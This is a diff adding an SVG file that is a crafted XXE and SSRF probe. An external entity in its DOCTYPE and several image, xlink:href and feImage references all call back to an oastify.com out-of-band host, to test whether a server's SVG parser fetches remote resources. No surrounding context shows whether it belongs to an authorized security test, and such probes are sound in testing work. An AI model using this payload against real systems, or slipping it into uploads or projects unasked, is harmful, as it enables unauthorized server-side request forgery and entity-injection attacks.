@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "https://nja7ub1ut16pvyt5i28w34ndd4jx7m.oastify.com/xxe-entity"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="256" height="256">
+  <text x="10" y="20" font-size="12">&xxe;</text>
+  <image x="0" y="0" width="128" height="128" href="https://nja7ub1ut16pvyt5i28w34ndd4jx7m.oastify.com/image-href.png"/>
+  <image x="0" y="128" width="128" height="128" xlink:href="https://nja7ub1ut16pvyt5i28w34ndd4jx7m.oastify.com/xlink-href.png"/>
+  <feImage xlink:href="https://nja7ub1ut16pvyt5i28w34ndd4jx7m.oastify.com/feimage.png"/>
+  <rect width="256" height="256" fill="none" stroke="#000"/>
+</svg>
